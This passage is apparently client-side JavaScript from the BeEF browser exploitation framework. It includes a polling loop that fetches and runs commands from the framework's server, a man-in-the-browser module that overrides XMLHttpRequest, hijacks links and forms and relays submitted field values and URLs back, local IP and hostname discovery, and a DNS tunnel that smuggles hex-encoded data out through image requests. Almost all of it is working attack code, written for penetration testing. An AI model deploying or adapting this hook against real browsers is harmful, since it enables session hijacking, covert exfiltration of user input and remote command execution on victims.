     */
    push: function (stream) {
        //need to implement wait feature here eventually
        for (var i = 0; i < stream.pc; i++) {
            this.request(this.httpproto, 'GET', this.host, this.port, this.handler, null, stream.get_packet_data(), 10, 'text', null);
        }
    },

    /**
     * Performs http requests
     * @param: {String} scheme: HTTP or HTTPS
     * @param: {String} method: GET or POST
     * @param: {String} domain: bindshell.net, 192.168.3.4, etc
     * @param: {Int} port: 80, 5900, etc
     * @param: {String} path: /path/to/resource
     * @param: {String} anchor: this is the value that comes after the # in the URL
     * @param: {String} data: This will be used as the query string for a GET or post data for a POST
     * @param: {Int} timeout: timeout the request after N seconds
     * @param: {String} dataType: specify the data return type expected (ie text/html/script)
     * @param: {Function} callback: call the callback function at the completion of the method
     *
     * @return: {Object} response: this object contains the response details
     */
    request: function (scheme, method, domain, port, path, anchor, data, timeout, dataType, callback) {
        //check if same domain or cross domain
        var cross_domain = true;
        if (document.domain == domain.replace(/(\r\n|\n|\r)/gm, "")) { //strip eventual line breaks
            if (document.location.port == "" || document.location.port == null) {
                cross_domain = !(port == "80" || port == "443");
            }
        }

        //build the url
        var url = "";
        if (path.indexOf("http://") != -1 || path.indexOf("https://") != -1) {
            url = path;
        } else {
            url = scheme + "://" + domain;
            url = (port != null) ? url + ":" + port : url;
            url = (path != null) ? url + path : url;
            url = (anchor != null) ? url + "#" + anchor : url;
        }

        //define response object
        var response = new this.response;
        response.was_cross_domain = cross_domain;
        var start_time = new Date().getTime();

        /*
         * according to http://api.jquery.com/jQuery.ajax/, Note: having 'script':
         * This will turn POSTs into GETs for remote-domain requests.
         */
        if (method == "POST") {
            $j.ajaxSetup({
                dataType: dataType
            });
        } else {
            $j.ajaxSetup({
                dataType: 'script'
            });
        }

        //build and execute the request
        $j.ajax({type: method,
            url: url,
            data: data,
            timeout: (timeout * 1000),

            //This is needed, otherwise jQuery always add Content-type: application/xml, even if data is populated.
            beforeSend: function (xhr) {
                if (method == "POST") {
                    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded; charset=utf-8");
                }
            },
            success: function (data, textStatus, xhr) {
                var end_time = new Date().getTime();
                response.status_code = xhr.status;
                response.status_text = textStatus;
                response.response_body = data;
                response.port_status = "open";
                response.was_timedout = false;
                response.duration = (end_time - start_time);
            },
            error: function (jqXHR, textStatus, errorThrown) {
                var end_time = new Date().getTime();
                response.response_body = jqXHR.responseText;
                response.status_code = jqXHR.status;
                response.status_text = textStatus;
                response.duration = (end_time - start_time);
                response.port_status = "open";
            },
            complete: function (jqXHR, textStatus) {
                response.status_code = jqXHR.status;
                response.status_text = textStatus;
                response.headers = jqXHR.getAllResponseHeaders();
                // determine if TCP port is open/closed/not-http
                if (textStatus == "timeout") {
                    response.was_timedout = true;
                    response.response_body = "ERROR: Timed out\n";
                    response.port_status = "closed";
                } else if (textStatus == "parsererror") {
                    response.port_status = "not-http";
                } else {
                    response.port_status = "open";
                }
            }
        }).always(function () {
                if (callback != null) {
                    callback(response);
                }
            });
        return response;
    },

    /*
     * Similar to beef.net.request, except from a few things that are needed when dealing with forged requests:
     *  - requestid: needed on the callback
     *  - allowCrossDomain: set cross-domain requests as allowed or blocked
     *
     * forge_request is used mainly by the Requester and Tunneling Proxy Extensions.
     * Example usage:
     * beef.net.forge_request("http", "POST", "172.20.40.50", 8080, "/lulz",
     *   true, null, { foo: "bar" }, 5, 'html', false, null, function(response) {
     *   alert(response.response_body)})
     */
    forge_request: function (scheme, method, domain, port, path, anchor, headers, data, timeout, dataType, allowCrossDomain, requestid, callback) {

        // check if same domain or cross domain
        var cross_domain = true;
        if (domain == "undefined" || path == "undefined") {
            return;
        }
        if (document.domain == domain.replace(/(\r\n|\n|\r)/gm, "")) { //strip eventual line breaks
            if (document.location.port == "" || document.location.port == null) {
                cross_domain = !(port == "80" || port == "443");
            } else {
                if (document.location.port == port) cross_domain = false;
            }
        }
        // build the url
        var url = "";
        if (path.indexOf("http://") != -1 || path.indexOf("https://") != -1) {
            url = path;
        } else {
            url = scheme + "://" + domain;
            url = (port != null) ? url + ":" + port : url;
            url = (path != null) ? url + path : url;
            url = (anchor != null) ? url + "#" + anchor : url;
        }

        // define response object
        var response = new this.response;
        response.was_cross_domain = cross_domain;
        var start_time = new Date().getTime();

        // if cross-domain requests are not allowed and the request is cross-domain
        // don't proceed and return
        if (allowCrossDomain == "false" && cross_domain && callback != null) {
            response.status_code = -1;
            response.status_text = "crossdomain";
            response.port_status = "crossdomain";
            response.response_body = "ERROR: Cross Domain Request. The request was not sent.\n";
            response.headers = "ERROR: Cross Domain Request. The request was not sent.\n";
            callback(response, requestid);
            return response;
        }

        /*
         * according to http://api.jquery.com/jQuery.ajax/, Note: having 'script':
         * This will turn POSTs into GETs for remote-domain requests.
         */
        if (method == "POST") {
            $j.ajaxSetup({
                dataType: dataType
            });
        } else {
            $j.ajaxSetup({
                dataType: 'script'
            });
        }

        // this is required for bugs in IE so data can be transferred back to the server
        if (beef.browser.isIE()) {
            dataType = 'script'
        }

        $j.ajax({type: method,
            dataType: dataType,
            url: url,
            headers: headers,
            timeout: (timeout * 1000),

            //This is needed, otherwise jQuery always add Content-type: application/xml, even if data is populated.
            beforeSend: function (xhr) {
                if (method == "POST") {
                    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded; charset=utf-8");
                }
            },

            data: data,

            // http server responded successfully
            success: function (data, textStatus, xhr) {
                var end_time = new Date().getTime();
                response.status_code = xhr.status;
                response.status_text = textStatus;
                response.response_body = data;
                response.was_timedout = false;
                response.duration = (end_time - start_time);
            },

            // server responded with a http error (403, 404, 500, etc)
            // or server is not a http server
            error: function (xhr, textStatus, errorThrown) {
                var end_time = new Date().getTime();
                response.response_body = xhr.responseText;
                response.status_code = xhr.status;
                response.status_text = textStatus;
                response.duration = (end_time - start_time);
            },

            complete: function (xhr, textStatus) {
                // cross-domain request
                if (cross_domain) {

                    response.port_status = "crossdomain";

                    if (xhr.status != 0) {
                        response.status_code = xhr.status;
                    } else {
                        response.status_code = -1;
                    }

                    if (textStatus) {
                        response.status_text = textStatus;
                    } else {
                        response.status_text = "crossdomain";
                    }

                    if (xhr.getAllResponseHeaders()) {
                        response.headers = xhr.getAllResponseHeaders();
                    } else {
                        response.headers = "ERROR: Cross Domain Request. The request was sent however it is impossible to view the response.\n";
                    }

                    if (!response.response_body) {
                        response.response_body = "ERROR: Cross Domain Request. The request was sent however it is impossible to view the response.\n";
                    }

                } else {
                    // same-domain request
                    response.status_code = xhr.status;
                    response.status_text = textStatus;
                    response.headers = xhr.getAllResponseHeaders();

                    // determine if TCP port is open/closed/not-http
                    if (textStatus == "timeout") {
                        response.was_timedout = true;
                        response.response_body = "ERROR: Timed out\n";
                        response.port_status = "closed";
                        /*
                         * With IE we need to explicitly set the dataType to "script",
                         * so there will be always parse-errors if the content is != javascript
                         * */
                    } else if (textStatus == "parsererror") {
                        response.port_status = "not-http";
                        if (beef.browser.isIE()) {
                            response.status_text = "success";
                            response.port_status = "open";
                        }
                    } else {
                        response.port_status = "open";
                    }
                }
                callback(response, requestid);
            }
        });
        return response;
    },

    //this is a stub, as associative arrays are not parsed by JSON, all key / value pairs should use new Object() or {}
    //http://andrewdupont.net/2006/05/18/javascript-associative-arrays-considered-harmful/
    clean: function (r) {
        if (this.array_has_string_key(r)) {
            var obj = {};
            for (var key in r)
                obj[key] = (this.array_has_string_key(obj[key])) ? this.clean(r[key]) : r[key];
            return obj;
        }
        return r;
    },

    //Detects if an array has a string key
    array_has_string_key: function (arr) {
        if ($j.isArray(arr)) {
            try {
                for (var key in arr)
                    if (isNaN(parseInt(key))) return true;
            } catch (e) {
            }
        }
        return false;
    },

    /**
     * Sends back browser details to framework, calling beef.browser.getDetails()
     */
    browser_details: function () {
        var details = beef.browser.getDetails();
        details['HookSessionID'] = beef.session.get_hook_session_id();
        this.send('/init', 0, details);
    }

};


beef.regCmp('beef.net');


//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/*!
 * @Literal object: beef.updater
 *
 * Object in charge of getting new commands from the BeEF framework and execute them.
 * The XHR-polling channel is managed here. If WebSockets are enabled,
 * websocket.ls is used instead.
 */
beef.updater = {
	
	// XHR-polling timeout.
    xhr_poll_timeout: "1000",
    beefhook: "BEEFHOOK",
	
	// A lock.
	lock: false,
	
	// An object containing all values to be registered and sent by the updater.
	objects: new Object(),
	
	/*
	 * Registers an object to always send when requesting new commands to the framework.
	 * @param: {String} the name of the object.
	 * @param: {String} the value of that object.
	 * 
	 * @example: beef.updater.regObject('java_enabled', 'true');
	 */
	regObject: function(key, value) {
		this.objects[key] = escape(value);
	},
	
	// Checks for new commands from the framework and runs them.
	check: function() {
		if(this.lock == false) {
			if (beef.logger.running) {
				beef.logger.queue();
			}
			beef.net.flush();
			if(beef.commands.length > 0) {
				this.execute_commands();
			}else {
				this.get_commands();    /*Polling*/
			}
		}
        /* The following gives a stupid syntax error in IE, which can be ignored*/
        setTimeout(function(){beef.updater.check()}, beef.updater.xhr_poll_timeout);
	},
	
    /**
     * Gets new commands from the framework.
     */
	get_commands: function() {
		try {
			this.lock = true;
            beef.net.request(beef.net.httpproto, 'GET', beef.net.host, beef.net.port, beef.net.hook, null, beef.updater.beefhook+'='+beef.session.get_hook_session_id(), 5, 'script', function(response) {
                if (response.body != null && response.body.length > 0)
                    beef.updater.execute_commands();
            });
		} catch(e) {
			this.lock = false;
			return;
		}
		this.lock = false;
	},
	
    /**
     * Executes the received commands, if any.
     */
	execute_commands: function() {
		if(beef.commands.length == 0) return;
		this.lock = true;
		while(beef.commands.length > 0) {
			command = beef.commands.pop();
			try {
				command();
			} catch(e) {
				beef.debug('execute_commands - command failed to execute: ' + e.message);
                // prints the command source to be executed, to better trace errors
                // beef.client_debug must be enabled in the main config
                beef.debug(command.toString());
			}
		}
		this.lock = false;
	}
};

beef.regCmp('beef.updater');


//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

// Base64 code from http://stackoverflow.com/questions/3774622/how-to-base64-encode-inside-of-javascript/3774662#3774662

beef.encode = {};

beef.encode.base64 = {
	
	keyStr: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",

    encode : function (input) {
        if (window.btoa) {
           return btoa(unescape(encodeURIComponent(input)));
        }

        var output = "";
        var chr1, chr2, chr3, enc1, enc2, enc3, enc4;
        var i = 0;

        input = beef.encode.base64.utf8_encode(input);

        while (i < input.length) {

            chr1 = input.charCodeAt(i++);
            chr2 = input.charCodeAt(i++);
            chr3 = input.charCodeAt(i++);

            enc1 = chr1 >> 2;
            enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
            enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
            enc4 = chr3 & 63;

            if (isNaN(chr2)) {
                enc3 = enc4 = 64;
            } else if (isNaN(chr3)) {
                enc4 = 64;
            }

            output = output +
            this.keyStr.charAt(enc1) + this.keyStr.charAt(enc2) +
            this.keyStr.charAt(enc3) + this.keyStr.charAt(enc4);

        }

        return output;
    },


    decode : function (input) {
        if (window.atob) {
            return escape(atob(input));
        }

        var output = "";
        var chr1, chr2, chr3;
        var enc1, enc2, enc3, enc4;
        var i = 0;

        input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");

        while (i < input.length) {

            enc1 = this.keyStr.indexOf(input.charAt(i++));
            enc2 = this.keyStr.indexOf(input.charAt(i++));
            enc3 = this.keyStr.indexOf(input.charAt(i++));
            enc4 = this.keyStr.indexOf(input.charAt(i++));

            chr1 = (enc1 << 2) | (enc2 >> 4);
            chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
            chr3 = ((enc3 & 3) << 6) | enc4;

            output = output + String.fromCharCode(chr1);

            if (enc3 != 64) {
                output = output + String.fromCharCode(chr2);
            }
            if (enc4 != 64) {
                output = output + String.fromCharCode(chr3);
            }

        }

        output = beef.encode.base64.utf8_decode(output);

        return output;

    },


   utf8_encode : function (string) {
        string = string.replace(/\r\n/g,"\n");
        var utftext = "";

        for (var n = 0; n < string.length; n++) {

            var c = string.charCodeAt(n);

            if (c < 128) {
                utftext += String.fromCharCode(c);
            }
            else if((c > 127) && (c < 2048)) {
                utftext += String.fromCharCode((c >> 6) | 192);
                utftext += String.fromCharCode((c & 63) | 128);
            }
            else {
                utftext += String.fromCharCode((c >> 12) | 224);
                utftext += String.fromCharCode(((c >> 6) & 63) | 128);
                utftext += String.fromCharCode((c & 63) | 128);
            }

        }

        return utftext;
    },

    utf8_decode : function (utftext) {
        var string = "";
        var i = 0;
        var c = c1 = c2 = 0;

        while ( i < utftext.length ) {

            c = utftext.charCodeAt(i);

            if (c < 128) {
                string += String.fromCharCode(c);
                i++;
            }
            else if((c > 191) && (c < 224)) {
                c2 = utftext.charCodeAt(i+1);
                string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
                i += 2;
            }
            else {
                c2 = utftext.charCodeAt(i+1);
                c3 = utftext.charCodeAt(i+2);
                string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
                i += 3;
            }

        }

        return string;
    }

};

beef.regCmp('beef.encode.base64');


//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

// Json code from Brantlye Harris-- http://code.google.com/p/jquery-json/

beef.encode.json = {
	
	stringify: function(o) {
        if (typeof(JSON) == 'object' && JSON.stringify) {
            // Error on stringifying cylcic structures caused polling to die
            try {
                s = JSON.stringify(o);    
            } catch(error) {
                // TODO log error / handle cyclic structures? 
            }
            return s;
        }
        var type = typeof(o);
    
        if (o === null)
            return "null";
    
        if (type == "undefined")
            return '\"\"';
        
        if (type == "number" || type == "boolean")
            return o + "";
    
        if (type == "string")
            return $j.quoteString(o);
    
        if (type == 'object')
        {
            if (typeof o.toJSON == "function") 
                return $j.toJSON( o.toJSON() );
            
            if (o.constructor === Date)
            {
                var month = o.getUTCMonth() + 1;
                if (month < 10) month = '0' + month;

                var day = o.getUTCDate();
                if (day < 10) day = '0' + day;

                var year = o.getUTCFullYear();
                
                var hours = o.getUTCHours();
                if (hours < 10) hours = '0' + hours;
                
                var minutes = o.getUTCMinutes();
                if (minutes < 10) minutes = '0' + minutes;
                
                var seconds = o.getUTCSeconds();
                if (seconds < 10) seconds = '0' + seconds;
                
                var milli = o.getUTCMilliseconds();
                if (milli < 100) milli = '0' + milli;
                if (milli < 10) milli = '0' + milli;

                return '"' + year + '-' + month + '-' + day + 'T' +
                             hours + ':' + minutes + ':' + seconds + 
                             '.' + milli + 'Z"'; 
            }

            if (o.constructor === Array) 
            {
                var ret = [];
                for (var i = 0; i < o.length; i++)
                    ret.push( $j.toJSON(o[i]) || "null" );

                return "[" + ret.join(",") + "]";
            }
        
            var pairs = [];
            for (var k in o) {
                var name;
                var type = typeof k;

                if (type == "number")
                    name = '"' + k + '"';
                else if (type == "string")
                    name = $j.quoteString(k);
                else
                    continue;  //skip non-string or number keys
            
                if (typeof o[k] == "function") 
                    continue;  //skip pairs where the value is a function.
            
                var val = $j.toJSON(o[k]);
            
                pairs.push(name + ":" + val);
            }

            return "{" + pairs.join(", ") + "}";
        }
    },

    quoteString: function(string) {
        if (string.match(this._escapeable))
        {
            return '"' + string.replace(this._escapeable, function (a) 
            {
                var c = this._meta[a];
                if (typeof c === 'string') return c;
                c = a.charCodeAt();
                return '\\u00' + Math.floor(c / 16).toString(16) + (c % 16).toString(16);
            }) + '"';
        }
        return '"' + string + '"';
    },
    
    _escapeable: /["\\\x00-\x1f\x7f-\x9f]/g,
    
    _meta : {
        '\b': '\\b',
        '\t': '\\t',
        '\n': '\\n',
        '\f': '\\f',
        '\r': '\\r',
        '"' : '\\"',
        '\\': '\\\\'
    }
};

$j.toJSON = function(o) {return beef.encode.json.stringify(o);};
$j.quoteString = function(o) {return beef.encode.json.quoteString(o);};

beef.regCmp('beef.encode.json');


//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/*!
 * @literal object: beef.net.local
 * 
 * Provides networking functions for the local/internal network of the zombie.
 */
beef.net.local = {
	
	sock: false,
	checkJava: false,
	hasJava: false,
	
	/**
	 * Initializes the java socket. We have to use this method because
	 * some browsers do not have java installed or it is not accessible.
	 * in which case creating a socket directly generates an error. So this code
	 * is invalid:
	 * sock: new java.net.Socket();
	 */

	initializeSocket: function() {
		if(this.checkJava){	
			if(!beef.browser.hasJava()) {
				this.checkJava=True;
				this.hasJava=False;
				return -1;
			}else{
				this.checkJava=True;
				this.hasJava=True;
				return 1;
			}
		}
		else{
			if(!this.hasJava) return -1;
			else{	
				try {
					this.sock = new java.net.Socket();
				} catch(e) {
					return -1;
				}
				return 1;
			}
		}
	},
	
	/**
	 * Returns the internal IP address of the zombie.
	 * @return: {String} the internal ip of the zombie.
	 * @error: return -1 if the internal ip cannot be retrieved.
	 */
	getLocalAddress: function() {
		if(!this.hasJava) return false;
		
		this.initializeSocket();
		
		try {
			this.sock.bind(new java.net.InetSocketAddress('0.0.0.0', 0));
			this.sock.connect(new java.net.InetSocketAddress(document.domain, (!document.location.port)?80:document.location.port));
			
			return this.sock.getLocalAddress().getHostAddress();
		} catch(e) { return false; }
	},
	
	/**
	 * Returns the internal hostname of the zombie.
	 * @return: {String} the internal hostname of the zombie.
	 * @error: return -1 if the hostname cannot be retrieved.
	 */
	getLocalHostname: function() {
		if(!this.hasJava) return false;
		
		this.initializeSocket();
		
		try {
			this.sock.bind(new java.net.InetSocketAddress('0.0.0.0', 0));
			this.sock.connect(new java.net.InetSocketAddress(document.domain, (!document.location.port)?80:document.location.port));
			
			return this.sock.getLocalAddress().getHostName();
		} catch(e) { return false; }
	}
	
};

beef.regCmp('beef.net.local');


//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/**
 * @literal object: beef.init
 * Contains the beef_init() method which starts the BeEF client-side
 * logic. Also, it overrides the 'onpopstate' and 'onclose' events on the windows object.
 *
 * If beef.pageIsLoaded is true, then this JS has been loaded >1 times
 * and will have a new session id. The new session id will need to know
 * the brwoser details. So sendback the browser details again.
 */

beef.session.get_hook_session_id();

if (beef.pageIsLoaded) {
    beef.net.browser_details();
}

window.onload = function () {
    beef_init();
};

window.onpopstate = function (event) {
    if (beef.onpopstate.length > 0) {
        event.preventDefault;
        for (var i = 0; i < beef.onpopstate.length; i++) {
            var callback = beef.onpopstate[i];
            try {
                callback(event);
            } catch (e) {
                beef.debug("window.onpopstate - couldn't execute callback: " + e.message);
            }
            return false;
        }
    }
};

window.onclose = function (event) {
    if (beef.onclose.length > 0) {
        event.preventDefault;
        for (var i = 0; i < beef.onclose.length; i++) {
            var callback = beef.onclose[i];
            try {
                callback(event);
            } catch (e) {
                beef.debug("window.onclose - couldn't execute callback: " + e.message);
            }
            return false;
        }
    }
};

/**
 * Starts the polling mechanism, and initialize various components:
 *  - browser details (see browser.js) are sent back to the "/init" handler
 *  - the polling starts (checks for new commands, and execute them)
 *  - the logger component is initialized (see logger.js)
 *  - the Autorun Engine is initialized (see are.js)
 */
function beef_init() {
    if (!beef.pageIsLoaded) {
        beef.pageIsLoaded = true;
        if (beef.browser.hasWebSocket() && typeof beef.websocket != 'undefined') {
            beef.websocket.start();
            beef.net.browser_details();
            beef.updater.execute_commands();
            beef.logger.start();
        }else {
            beef.net.browser_details();
            beef.updater.execute_commands();
            beef.updater.check();
            beef.logger.start();
        }
    }
}


//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//


beef.mitb = {

    cid:null,
    curl:null,

    init:function (cid, curl) {
        beef.mitb.cid = cid;
        beef.mitb.curl = curl;
        /*Override open method to intercept ajax request*/
        var hook_file = "/hook.js";

        if (window.XMLHttpRequest && !(window.ActiveXObject)) {

            beef.mitb.sniff("Method XMLHttpRequest.open override");
            (function (open) {
                XMLHttpRequest.prototype.open = function (method, url, async, mitb_call) {
                    // Ignore it and don't hijack it. It's either a request to BeEF (hook file or Dynamic Handler)
                    // or a request initiated by the MiTB itself.
                    if (mitb_call || (url.indexOf(hook_file) != -1 || url.indexOf("/dh?") != -1)) {
                        open.call(this, method, url, async, true);
                    }else {
                        var portRegex = new RegExp(":[0-9]+");
                        var portR = portRegex.exec(url);
                        var requestPort;
                        if (portR != null) { requestPort = portR[0].split(":")[1]; }

                        //GET request
                        if (method == "GET") {
                            //GET request -> cross-origin
                            if (url.indexOf(document.location.hostname) == -1 || (portR != null && requestPort != document.location.port )) {
                                beef.mitb.sniff("GET [Ajax CrossDomain Request]: " + url);
                                window.open(url);
                            }else { //GET request -> same-origin
                                beef.mitb.sniff("GET [Ajax Request]: " + url);
                                if (beef.mitb.fetch(url, document.getElementsByTagName("html")[0])) {
                                    var title = "";
                                    if (document.getElementsByTagName("title").length == 0) {
                                        title = document.title;
                                    } else {
                                        title = document.getElementsByTagName("title")[0].innerHTML;
                                    }
                                    // write the url of the page
                                    history.pushState({ Be:"EF" }, title, url);
                                }
                            }
                        }else{
                            //POST request
                            beef.mitb.sniff("POST ajax request to: " + url);
                            open.call(this, method, url, async, true);
                        }
                    }
                };
            })(XMLHttpRequest.prototype.open);
        }
    },

    // Initializes the hook on anchors and forms.
    hook:function () {
        beef.onpopstate.push(function (event) {
            beef.mitb.fetch(document.location, document.getElementsByTagName("html")[0]);
        });
        beef.onclose.push(function (event) {
            beef.mitb.endSession();
        });

        var anchors = document.getElementsByTagName("a");
        var forms = document.getElementsByTagName("form");
        var lis = document.getElementsByTagName("li");

        for (var i = 0; i < anchors.length; i++) {
            anchors[i].onclick = beef.mitb.poisonAnchor;
        }
        for (var i = 0; i < forms.length; i++) {
            beef.mitb.poisonForm(forms[i]);
        }

        for (var i = 0; i < lis.length; i++) {
            if (lis[i].hasAttribute("onclick")) {
                lis[i].removeAttribute("onclick");
                /*clear*/
                lis[i].setAttribute("onclick", "beef.mitb.fetchOnclick('" + lis[i].getElementsByTagName("a")[0] + "')");
                /*override*/

            }
        }
    },

    // Hooks anchors and prevents them from linking away
    poisonAnchor:function (e) {
        try {
            e.preventDefault;
            if (beef.mitb.fetch(e.currentTarget, document.getElementsByTagName("html")[0])) {
                var title = "";
                if (document.getElementsByTagName("title").length == 0) {
                    title = document.title;
                } else {
                    title = document.getElementsByTagName("title")[0].innerHTML;
                }
                history.pushState({ Be:"EF" }, title, e.currentTarget);
            }
        } catch (e) {
            beef.debug('beef.mitb.poisonAnchor - failed to execute: ' + e.message);
        }
        return false;
    },

    // Hooks forms and prevents them from linking away
    poisonForm:function (form) {
        form.onsubmit = function (e) {
            var inputs = form.getElementsByTagName("input");
            var query = "";
            for (var i = 0; i < inputs.length; i++) {
                if (i > 0 && i < inputs.length - 1) query += "&";
                switch (inputs[i].type) {
                    case "submit":
                        break;
                    default:
                        query += inputs[i].name + "=" + inputs[i].value;
                        break;
                }
            }
            e.preventdefault;
            beef.mitb.fetchForm(form.action, query, document.getElementsByTagName("html")[0]);
            history.pushState({ Be:"EF" }, "", form.action);
            return false;
        }
    },

    // Fetches a hooked form with AJAX
    fetchForm:function (url, query, target) {
        try {
            var y = new XMLHttpRequest();
            y.open('POST', url, false, true);
            y.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            y.onreadystatechange = function () {
                if (y.readyState == 4 && y.responseText != "") {
                    target.innerHTML = y.responseText;
                    setTimeout(beef.mitb.hook, 10);
                }
            };
            y.send(query);
            beef.mitb.sniff("POST: " + url + "[" + query + "]");
            return true;
        } catch (x) {
            return false;
        }
    },

    // Fetches a hooked link with AJAX
    fetch:function (url, target) {
        try {
            var y = new XMLHttpRequest();
            y.open('GET', url, false, true);
            y.onreadystatechange = function () {
                if (y.readyState == 4 && y.responseText != "") {
                    target.innerHTML = y.responseText;
                    setTimeout(beef.mitb.hook, 10);
                }
            };
            y.send(null);
            beef.mitb.sniff("GET: " + url);
            return true;
        } catch (x) {
            window.open(url);
            beef.mitb.sniff("GET [New Window]: " + url);
            return false;
        }
    },

    // Fetches a window.location=http://domainname.com and setting up history
    fetchOnclick:function (url) {
        try {
            var target = document.getElementsByTagName("html")[0];
            var y = new XMLHttpRequest();
            y.open('GET', url, false, true);
            y.onreadystatechange = function () {
                if (y.readyState == 4 && y.responseText != "") {
                    var title = "";
                    if (document.getElementsByTagName("title").length == 0) {
                        title = document.title;
                    }
                    else {
                        title = document.getElementsByTagName("title")[0].innerHTML;
                        }
                    history.pushState({ Be:"EF" }, title, url);
                    target.innerHTML = y.responseText;
                    setTimeout(beef.mitb.hook, 10);
                }
            };
            y.send(null);
            beef.mitb.sniff("GET: " + url);

        } catch (x) {
            // the link is cross-origin, so load the resource in a different tab
            window.open(url);
            beef.mitb.sniff("GET [New Window]: " + url);
        }
    },

    // Relays an entry to the framework
    sniff:function (result) {
        try {
            beef.net.send(beef.mitb.cid, beef.mitb.curl, result);
        } catch (x) {
        }
        return true;
    },

    // Signals the Framework that the user has lost the hook
    endSession:function () {
        beef.mitb.sniff("Window closed.");
    }
};

beef.regCmp('beef.mitb');


//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/*!
 * @literal object: beef.net.dns
 * 
 * request object structure:
 * + msgId: {Integer} Unique message ID for the request.
 * + domain: {String} Remote domain to retrieve the data.
 * + wait: {Integer} Wait time between requests (milliseconds) - NOT IMPLEMENTED
 * + callback: {Function} Callback function to receive the number of requests sent.
 */

beef.net.dns = {

	handler: "dns",

	send: function(msgId, data, domain, callback) {

        var encode_data = function(str) {
            var result="";
            for(i=0;i<str.length;++i) {
                result+=str.charCodeAt(i).toString(16).toUpperCase();
            }
            return result;
        };

        var encodedData = encodeURI(encode_data(data));

        beef.debug(encodedData);
        beef.debug("_encodedData_ length: " + encodedData.length);

        // limitations to DNS according to RFC 1035:
        // o Domain names must only consist of a-z, A-Z, 0-9, hyphen (-) and fullstop (.) characters
        // o Domain names are limited to 255 characters in length (including dots)
        // o The name space has a maximum depth of 127 levels (ie, maximum 127 subdomains)
        // o Subdomains are limited to 63 characters in length (including the trailing dot)

        // DNS request structure:
        // COMMAND_ID.SEQ_NUM.SEQ_TOT.DATA.DOMAIN
      //max_length: 3.   3   .   3   . 63 . x

        // only max_data_segment_length is currently used to split data into chunks. and only 1 chunk is used per request.
        // for optimal performance, use the following vars and use the whole available space (which needs changes server-side too)
        var reserved_seq_length = 3 + 3 + 3 + 3; // consider also 3 dots
        var max_domain_length = 255 - reserved_seq_length; //leave some space for sequence numbers
        var max_data_segment_length = 63; // by RFC

        beef.debug("max_data_segment_length: " + max_data_segment_length);

        var dom = document.createElement('b');

        String.prototype.chunk = function(n) {
            if (typeof n=='undefined') n=100;
            return this.match(RegExp('.{1,'+n+'}','g'));
        };

        var sendQuery = function(query) {
            var img = new Image;
            //img.src = "http://"+query;
            img.src = beef.net.httpproto + "://" + query; // prevents issues with mixed content
            img.onload = function() { dom.removeChild(this); }
            img.onerror = function() { dom.removeChild(this); }
            dom.appendChild(img);

            //experimental
            //setTimeout(function(){dom.removeChild(img)},1000);
        };

        var segments = encodedData.chunk(max_data_segment_length);

        var ident = "0xb3"; //see extensions/dns/dns.rb, useful to explicitly mark the DNS request as a tunnel request

        beef.debug(segments.length);

        for (var seq=1; seq<=segments.length; seq++) {
            sendQuery(ident + msgId + "." + seq + "." + segments.length + "." + segments[seq-1] + "." + domain);
        }

		// callback - returns the number of queries sent
		if (!!callback) callback(segments.length);

	}

};

beef.regCmp('beef.net.dns');



//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

// beef.net.connection - wraps Mozilla's Network Information API
// https://developer.mozilla.org/en-US/docs/Web/API/NetworkInformation
// https://developer.mozilla.org/en-US/docs/Web/API/Navigator/connection
beef.net.connection = {

  /* Returns the connection type
   * @example: beef.net.connection.type()
   * @note: https://developer.mozilla.org/en-US/docs/Web/API/NetworkInformation/type
   * @return: {String} connection type or 'unknown'.
   **/
  type: function () {
    try {
      var connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      var type = connection.type;
      if (/^[a-z]+$/.test(type)) return type; else return 'unknown';
    } catch(e) {
      beef.debug("Error retrieving connection type: " + e.message);
      return 'unknown';
    }
  },

  /* Returns the maximum downlink speed of the connection
   * @example: beef.net.connection.downlinkMax()
   * @note: https://developer.mozilla.org/en-US/docs/Web/API/NetworkInformation/downlinkMax
   * @return: {String} downlink max or 'unknown'.
   **/
  downlinkMax: function () {
    try {
      var connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      var max = connection.downlinkMax;
      if (max) return max; else return 'unknown';
    } catch(e) {
      beef.debug("Error retrieving connection downlink max: " + e.message);
      return 'unknown';
    }
  }

};

beef.regCmp('beef.net.connection');



beef.net.cors = {

  handler: "cors",

    /**
     * Response Object - used in the beef.net.request callback
     */
    response:function () {
        this.status  = null;      // 500, 404, 200, 302, etc
        this.headers = null;      // full response headers
        this.body    = null;      // full response body
    },

    /**
     * Make a cross-origin request using CORS
     *
     * @param method {String} HTTP verb ('GET', 'POST', 'DELETE', etc.)
     * @param url {String} url
     * @param data {String} request body
